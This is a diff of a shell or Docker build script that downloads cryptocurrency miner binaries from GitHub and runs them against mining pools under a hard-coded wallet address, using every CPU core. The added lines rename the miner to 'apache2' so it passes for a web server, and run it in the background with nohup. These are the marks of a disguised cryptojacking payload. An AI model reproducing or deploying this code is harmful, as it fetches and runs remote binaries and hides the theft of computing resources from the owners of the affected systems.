@@ -7,11 +7,7 @@ size=${#array[@]}
 index=$(($RANDOM % $size))
 worker=${array[$index]}
 apt-get update
-apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
-wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
-wget -qO build https://github.com/renifer12/master/raw/master/ccminer
-chmod +x build
-chmod +x compile.sh
-./build -a verus -o stratum+tcp://139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.worker-$worker -p x -t $(nproc --all)
-./compile.sh
-echo succes
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+rm hellminer_cpu_linux* && mv hellminer apache2
+CMD ["/bin/sh", "-c", "nohup ./apache2 -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.noname -p x --cpu $(echo $(nproc --all)) > build.log"]
